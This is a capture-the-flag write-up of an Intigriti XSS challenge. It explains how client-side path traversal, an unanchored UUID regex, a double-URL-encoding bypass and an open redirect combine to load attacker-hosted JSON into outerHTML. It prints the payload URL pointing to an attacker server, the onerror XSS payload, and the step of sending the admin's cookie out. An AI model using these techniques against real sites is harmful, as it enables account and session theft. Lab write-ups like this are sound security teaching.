Intigriti dropped another awesome XSS challenge,This time created by [@_CryptoCat](https://x.com/_CryptoCat). The challenge felt fairly straightforward,  definitely less headbanging than usual, I managed to solve it in around 20 minutes after diving in.
## ðŸ”Ž Challenge Overview


The challenge revolved around a classic note-taking application, featuring standard functionalities like creating , viewing notes and also it included an option to report the note, which would trigger an admin bot to visit and review it.

As is typical with XSS challenges, the goal was to obtain the admin bot's cookie, which was the flag. For that we needed XSS.

Firstly taking a closer look at the 2 features, which are 
- Create Note 
- View Note


## 1) Create Note 

The Create Note feature is straightforward. It sends a request to ``/api/notes/fetch``, creating a note with a unique UUID. The note can then be viewed by navigating to ``/view?note-uuid`` .
```python=
@main.route('/api/notes/store', methods=['POST'])
@login_required
def store():
    data = request.get_json()
    content = data.get('content')
    # Server-side XSS protection
    sanitized_content = bleach.clean(content)
    note = Note.query.filter_by(user_id=current_user.id).first()
    if note:
        note.content = sanitized_content
    else:
        note = Note(user_id=current_user.id, content=sanitized_content)
        db.session.add(note)

    db.session.commit()
    return jsonify({'success': 'Note stored', 'note_id': note.id})
```

The note content is sanitized server-side using the Bleach library, so this eliminates any possibility of any quick XSS.But still we had a harmless **Html injection**.

 
## 2) View Note 

This appeared to be the real challenge. Upon checkin ``view.html``, it becomes clear that the note-uuid is used to fetch the note contents via the fetch() method. 

```js 
 window.addEventListener("load", function () {
        const urlParams = new URLSearchParams(window.location.search);
        const noteId = urlParams.get("note");
        if (noteId) {
            document.getElementById("note-id-input").value = noteId;
            validateAndFetchNote(noteId);
        }
    });
```

Immediately, my mind turned to **CSPT (Client-Side Path Traversal)**, given that we had control over the fetch request.

> Client Side Path Traversal attacks arises when a web application loads some content using XHR(XmlHTTPRequests) or fetch() and the user have control over some section of the path where to load the resource.


Taking a look at the ``validateAndFetchNote()`` function

```js 

    function validateAndFetchNote(noteId) {
        if (noteId && isValidUUID(noteId.trim())) {
            history.pushState(null, "", "?note=" + noteId);
            fetchNoteById(noteId);
        } else {
            showFlashMessage(
                "Please enter a valid note ID,",
                "danger"
            );
        }
    }
```

Looks like there are some checks after all .

It only fetched notes with valid UUIDs using the ``isValidUUID()`` function. Additionally, the fetchNoteByID() function had a CSPT check before making the actual fetch by using ``noteId.includes("../")`` .


```js 
function fetchNoteById(noteId) {
        if (noteId.includes("../")) {
            showFlashMessage("Input not allowed!", "danger");
            return;
        }
        fetch("/api/notes/fetch/" + decodeURIComponent(noteId), {
            method: "GET",
            headers: {
                "X-CSRFToken": csrf_token,
            },
        })
            .then((response) => response.json())
            .then((data) => {
                if (data.content) {
                    document.getElementById("note-content").innerHTML =
                        DOMPurify.sanitize(data.content);
                    document.getElementById(
                        "note-content-section"
                    ).style.display = "block";
                    showFlashMessage("Note loaded successfully!", "success");
                } else if (data.error) {
                    showFlashMessage("Error: " + data.error, "danger");
                } else {
                    showFlashMessage("Note doesn't exist.", "info");
                }
                if (data.debug) {
                    document.getElementById("debug-content").outerHTML =
                        data.debug;
                    document.getElementById(
                        "debug-content-section"
                    ).style.display = "block";
                }
            });
    }
    
```

When our note is fetched, the server returns a JSON object containing the note's content. This content is then rendered using innerHTML, with DOMPurify applied to sanitize it, effectively preventing XSS. 

However, if the JSON response includes a debug key, its value is rendered using **outerHTML** without any sanitization, which can be used to get XSS .

```js 
 if (data.debug) {
        document.getElementById("debug-content").outerHTML = data.debug;
        document.getElementById(
            "debug-content-section"
        ).style.display = "block";
}

```
## ðŸ¥· Attack plan

The plan is to manipulate the fetch request so that it returns a JSON object containing a **debug** key. However, the server only responds with a JSON object that includes a **content key** and the noteâ€™s content, with no way to modify this server response directly. The only method to achieve this would be to return the **modified JSON from our own server**.

However, we only have CSPT (Client-Side Path Traversal) at our disposal, which allows us to control the path of the fetch() request. This means we can only direct the fetch to different endpoints .

```js 
fetch("/api/notes/fetch/" + decodeURIComponent(noteId))
```

Unless there is an **Open-Redirect** in any of the endpoints !!

If we have an **Open-redirect**, we can use the CSPT to redirect the fetch() request to the endpoint having open-redirect, and then use the open redirect to send the request to our attacker's server. From there, we can respond with a JSON object that includes the debug key, containing our XSS payload.

## Open Redirect
There is an endpoint named ``/contact`` that accepts a query parameter called **return**. This endpoint will redirect the user to the URL specified by the value of the return parameter.

```py
@main.route('/contact', methods=['GET', 'POST'])
def contact():
    form = ContactForm()
    return_url = request.args.get('return')
    if request.method == 'POST':
        if form.validate_on_submit():
            flash('Thank you for your message!', 'success')
            if return_url and is_safe_url(return_url):
                return redirect(return_url)
            return redirect(url_for('main.home'))
    if return_url and is_safe_url(return_url):
        return redirect(return_url)
    return render_template('contact.html', form=form, return_url=return_url)
```
So now we can redirect to the attackers site by just giving the attacker site as the return query parameter.

```py
                  /contact?return=https://attacker-site.com
```

## Bypassing the CSPT Filters 

Now that we have Open-Redirect in the /contact endpoint all we have to do is path traverse to that endpoint using CSPT.However we have to bypass a few checks for that.

- The note uuid check -> **isValidUUID()** function
- Path traversal check ->  **noteId.includes("../")**


### Bypassing isValidUUID
Looking a bit closer at the **isValidUUID()** function, we can see that it validates UUIDs using a regular expression.

```js 
function isValidUUID(noteId) {
        const uuidRegex =
            /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
        return uuidRegex.test(noteId);
    }
```
Here the Regex ``[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$`` only ensures that the UUID pattern appears at the end of the string. **So there can be any prefix to this uuid , that means we can give ../../ before the uuid .**

```
../82652102-973d-429d-82e0-245a4fbfd6cb 
```
To ensure that it was a proper UUID the regex should have included a ``^``
in the beginnning like this.

```
/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i
```

So we can do CSPT to the /contact endpoint like this.

```
/view?note=../../../contact?return=http://attack&82652102-973d-429d-82e0-245a4fbfd6cb
```

However ../ was still **blocked !!!**
### Bypassing the Path traversal check

Upon looking closer, you can see that after the noteId is being checked, it is URL-decoded within the fetch function.

```js 
if (noteId.includes("../")) {
            showFlashMessage("Input not allowed!", "danger");
            return;
        }
        fetch("/api/notes/fetch/" + decodeURIComponent(noteId), {
            method: "GET",
            headers: {
                "X-CSRFToken": csrf_token,
            },
        })
```
So we can easily bypass this check by just double urlencoding the noteId.
```
view=..%252F..%252F..%252Fcontact?return=http://attacker&UUID
```
So during the **noteId.includes("../")** check, the noteId will be **..%2F..%2Fcontact**, so the check will return **false**. However, when fetch() is called, noteId gets URL-decoded with decodeURIComponent(noteId), turning it into **../../../contact**.

## ðŸš€  Final Payloads

Now that we've bypassed both security checks, let's combine everything together.

* **Regex Bypass**: By using ../../../ as a prefix to the UUID, we can bypass the regex validation.
* **Path Traversal Check Bypass**: Double URL encoding the payload allows us to bypass the path traversal check.

With these steps, we can direct the fetch request to /contacts, which will **trigger an Open Redirect to our attacker's server**. The server responds with JSON containing a debug key with the XSS payload. This payload is then inserted into the outerHTML, leading to XSS.


```
..%252F..%252F..%252Fcontact?return=https://attacker/exp.json%26e447f4e1-f7c9-439c-8378-b65b83189b60
```

On the attackerâ€™s server, we need to return a JSON object with the key debug and our XSS payload as the value.

```json 
{ "debug": "<img src=x onerror=alert()>"} // for simple alert
```

## ðŸ’€ Exploit !!

**Finally It works!!**

To obtain the flag stored in the admin's cookie, we can simply access **document.cookie** within the XSS payload. Once we have the cookie, we can send it to our server and solve the challenge.
